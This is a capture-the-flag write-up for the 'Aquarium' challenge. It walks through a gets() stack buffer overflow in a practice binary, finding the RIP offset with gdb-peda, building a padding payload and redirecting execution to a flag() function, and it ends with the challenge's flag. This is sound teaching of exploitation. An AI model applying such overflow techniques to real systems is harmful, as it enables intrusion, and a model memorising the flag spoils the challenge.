# Aquarium
### 50 points, 305 solves

## Description
Here's a nice little [program](https://files.actf.co/7cb4b22337f719a06b0a2e7a5748e548f536150535f5f71b4226ce0204e2c13c/aquarium) that helps you manage your [fish tank](https://files.actf.co/6c6ba382ab8501ce48efb4f3bc8ece68264f07d65c637e2dfc280327a07e1715/aquarium.c)
<br/>
Run it on the shell server at /problems/2019/aquarium/ or connect with nc shell.actf.co 19305. <br/>

The vulnerable code is here
```c
printf("Enter the name of your fish tank: ");
	char name[50];
	gets(name);
```

**gets()** has a vulnerability that read all of your input.<br/>
Thus, making your program stack filled with your buffer.<br/>

According to the source code, we have a function named flag which read the flag.txt<br/>
```
void flag() {
	system("/bin/cat flag.txt");
}
```

but flag function is not called, but we have gets() so we can overflow the program<br/>
and control the eip to jump into flag function <br/>

In order to get bufferoverflow offset, I generated payload with peda's patten_create.<br/>
```bash
gdb-peda$ pattern_create 200
```
Then, we input the payload while inputting the name of fish tank where gets() is used.<br/>
We got SIGSEV Fault. Sounds goood<br/>

We check our RSP value and use pattern_offset to get offset.
```bash
gdb-peda$ x/wx $rsp
0x7fffffffe058:	0x41417041
gdb-peda$ pattern_offset 0x41417041
1094807617 found at offset: 152
```
Offset is 152 <br/>
I test if it were correct with generating payload with python<br/>
```python
print "A"*152 + "B"*6
```
I got 
```bash
Stopped reason: SIGSEGV
0x0000424242424242 in create_aquarium ()
```
yay we have control over rip.<br/>
then we pack the address of flag function after the offset where rip is controlled.<br/>

### Flag
>actf{overflowed_more_than_just_a_fish_tank}
